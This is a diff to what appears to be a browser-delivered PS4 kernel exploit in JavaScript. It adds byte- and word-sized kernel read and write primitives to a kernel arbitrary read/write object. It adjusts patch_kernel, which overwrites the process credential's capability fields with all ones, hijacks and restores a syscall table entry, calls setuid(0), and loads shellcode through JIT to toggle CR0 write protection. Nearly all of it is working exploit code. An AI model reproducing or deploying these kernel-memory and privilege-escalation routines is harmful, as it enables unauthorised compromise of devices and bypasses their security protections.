@@ -1408,6 +1408,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
       gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
     }
 
+    read8(addr) {
+      this._read(addr);
+      return this.rw_buf.read8(0);
+    }
+
+    read16(addr) {
+      this._read(addr);
+      return this.rw_buf.read16(0);
+    }
+
     read32(addr) {
       this._read(addr);
       return this.rw_buf.read32(0);
@@ -1416,6 +1426,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     read64(addr) {
       this._read(addr);
       return this.rw_buf.read64(0);
+    }
+
+    write8(addr, value) {
+      this.rw_buf.write8(0, value);
+      this.copyin(this.rw_buf.addr, addr, 1);
+    }
+
+    write16(addr, value) {
+      this.rw_buf.write16(0, value);
+      this.copyin(this.rw_buf.addr, addr, 2);
     }
 
     write32(addr, value) {
@@ -1470,6 +1490,9 @@ async function get_binary(url) {
   return response.arrayBuffer();
 }
 
+// Using JIT to load our own shellcode code here avoids the need to preform
+// some trick toggle the CR0 Protection Mode bit. We can just toggle it easily
+// within our shellcode.
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (!is_ps4) {
     throw RangeError("ps5 kernel patching unsupported");
@@ -1492,12 +1515,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   // .sy_thrcnt = SY_THR_STATIC
   kmem.write32(sysent_661.add(0x2c), 1);
 
-  log("add JIT capabilities");
+  log("set the bits for JIT privs");
   // TODO: Just set the bits for JIT privs
-  // cr_sceCaps[0]
-  kmem.write64(p_ucred.add(0x60), -1);
-  // cr_sceCaps[1]
-  kmem.write64(p_ucred.add(0x68), -1);
+  // cr_sceCaps[0] // 0x2000038000000000
+  kmem.write64(p_ucred.add(0x60), -1); // 0xffffffffffffffff
+  // cr_sceCaps[1] // 0x800000000000ff00
+  kmem.write64(p_ucred.add(0x68), -1); // 0xffffffffffffffff
 
   const buf = await get_binary(patch_elf_loc);
   const patches = new View1(await buf);
@@ -1558,10 +1581,10 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   sysi("setuid", 0);
   log("kernel exploit succeeded!");
 
-  kmem.write32(sysent_661, sy_narg);
-  kmem.write64(sysent_661.add(8), sy_call);
   kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-  log("restored dsys_aio_submit()");
+  kmem.write64(sysent_661.add(8), sy_call);
+  kmem.write32(sysent_661, sy_narg);
+  log("restored sys_aio_submit()");
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1605,6 +1628,10 @@ function setup(block_fd) {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
+  const _init_t1 = performance.now();
+  await init();
+  const _init_t2 = performance.now();
+
   // If setuid is successful, we dont need to run the kernel exploit again
   try {
     if (sysi("setuid", 0) == 0) {
@@ -1614,10 +1641,6 @@ export async function kexploit() {
   } catch {
     // Expected when not in an exploited state
   }
-
-  const _init_t1 = performance.now();
-  await init();
-  const _init_t2 = performance.now();
 
   // fun fact:
   // if the first thing you do since boot is run the web browser, WebKit can
@@ -1823,7 +1846,7 @@ function runPayload(path) {
         } catch (e) {
           log(`error in runPayload: ${e.message}`);
         }
-      } else if (xhr.status >= 400 && xhr.status < 600) {
+      } else {
         log(`error retrieving payload, ${xhr.status}`);
       }
     }
